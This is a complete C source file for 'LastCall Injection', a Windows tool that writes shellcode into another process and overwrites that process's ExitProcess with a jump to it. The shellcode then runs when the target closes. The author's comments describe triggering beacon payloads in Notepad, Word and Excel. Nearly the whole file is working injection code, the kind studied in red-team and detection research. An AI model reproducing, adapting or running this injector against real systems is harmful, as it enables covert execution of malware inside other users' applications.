// LastCall Injection
// "A process executes until one of the following events occurs:
//	  - Any thread of the process calls the ExitProcess function. 
//    - The last thread of the process terminates
//    - ..."
// Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/terminating-a-process
//
// --------------------------------------------------------------------------------------------
// 
// The idea is to inject shellcode into another process and stomp the instructions of it's ExitProcess(). 
// So when ExitProcess is called, the thread will be redirected to the shellcode instead of exiting.
// This seems to kill the window of the target application, but the process can be seen alive if you 
// are using complex shellcode like a beacon as opposed to popping calc. All of my testing has target 
// processes in sessions greater than 0. Stuff like Notepad, WORD, EXCEL have successfully triggered 
// execution when clicking the exit button in the GUI.
// - Wra7h

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
BOOL CALLBACK EnumWindowsCallback(HWND hWindow, LPARAM lParam);

typedef struct {
	DWORD dwProcessID;
	HWND hWindow;
} HANDLEDATA;

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD cbShellcode = 0;
	DWORD dwPID = 0;
	HINSTANCE hDLL = NULL;
	FARPROC pEP = NULL;

	HANDLE hProcess = NULL;
	PCHAR pShellcode = NULL;
	PBYTE pbMerged = NULL;

	if (argc != 3)
	{
		printf("Usage: LastCall.exe <pid> <C:\\Path\\To\\Shellcode.bin>");
		goto CLEANUP;
	}

	dwPID = wcstoul(argv[1], NULL, 0);

	//Read shellcode and setup
	Ret = ReadContents(argv[2], &pShellcode, &cbShellcode);

	if (!Ret)
	{
		printf("[!] Failed to read specified shellcode file.\n");
		goto CLEANUP;
	}

	// Get handle to process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	if (hProcess == NULL)
	{
		printf("[!] OpenProcess failed. Exiting...\n");
		goto CLEANUP;
	}

	//Allocate memory for shellcode
	PVOID hAlloc = VirtualAllocEx(hProcess,
		NULL, cbShellcode, MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
	{
		printf("[!] VirtualAllocEx failed. Exiting...\n");
		goto CLEANUP;
	}

	//Write the shellcode to the allocation address
	Ret = WriteProcessMemory(hProcess, hAlloc, pShellcode, cbShellcode, NULL);

	if (!Ret)
	{
		printf("[!] WriteProcessMemory failed to write shellcode. Exiting...\n");
		goto CLEANUP;
	}
	
	//Create a jmp to the address for shellcode
	BYTE mov_rax[] = {0x48, 0xb8};
	BYTE jmp_rax[] = {0xff, 0xe0};

	pbMerged = (PCHAR)malloc(sizeof(mov_rax) + sizeof(&hAlloc) + sizeof(jmp_rax));

	if (pbMerged == NULL)
		goto CLEANUP;

	size_t i = 0;
	memcpy(pbMerged + i, mov_rax, sizeof(mov_rax));
	i += sizeof(mov_rax);
	memcpy(pbMerged + i, &hAlloc, sizeof(&hAlloc));
	i += sizeof(&hAlloc);
	memcpy(pbMerged + i,jmp_rax, sizeof(jmp_rax));
	i += sizeof(jmp_rax);


	// Find the address of ExitProcess function
	hDLL = GetModuleHandleW(L"kernel32");

	if (hDLL == NULL)
	{
		printf("[!] GetModuleHandle failed. Exiting...\n");
		goto CLEANUP;
	}

	pEP = GetProcAddress(hDLL, "ExitProcess"); 

	if (pEP == NULL)
	{
		printf("[!] GetProcAddress failed to find ExitProcess. Exiting...\n");
		goto CLEANUP;
	}
	
	//Write the jmp to shellcode to the ExitProcess address
	Ret = WriteProcessMemory(hProcess, pEP, pbMerged, sizeof(mov_rax) + sizeof(&hAlloc) + sizeof(jmp_rax), NULL);
	if (!Ret)
	{
		printf("[!] WriteProcessMemory failed to write jmp. Exiting...\n");
		goto CLEANUP;
	}

	// EnumWindows -> SendMessage WM_CLOSE to target window
	HANDLEDATA SProcWnd = { 0 };
	SProcWnd.dwProcessID = dwPID;

	EnumWindows(EnumWindowsCallback, (LPARAM)&SProcWnd);

	if (SProcWnd.hWindow != NULL)
	{
		SendMessageW(SProcWnd.hWindow, WM_CLOSE, NULL, NULL);

		printf("[+] Finished! WM_CLOSE message sent to target process.\n");
	}
	else
	{
		printf("[+] Finished! No window found, just wait for the process to be cleanly exited.\n");
	}

CLEANUP:

	if (hProcess != NULL)
		CloseHandle(hProcess);

	if (pShellcode)
		free(pShellcode);

	if (pbMerged)
		free(pbMerged);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}

BOOL CALLBACK EnumWindowsCallback(HWND hWnd, LPARAM lParam)
{
	HANDLEDATA* pData = (HANDLEDATA*)lParam;
	unsigned long process_id = 0;
	GetWindowThreadProcessId(hWnd, &process_id);
	if (pData->dwProcessID != process_id)
		return TRUE;
	pData->hWindow = hWnd;
	return FALSE;
}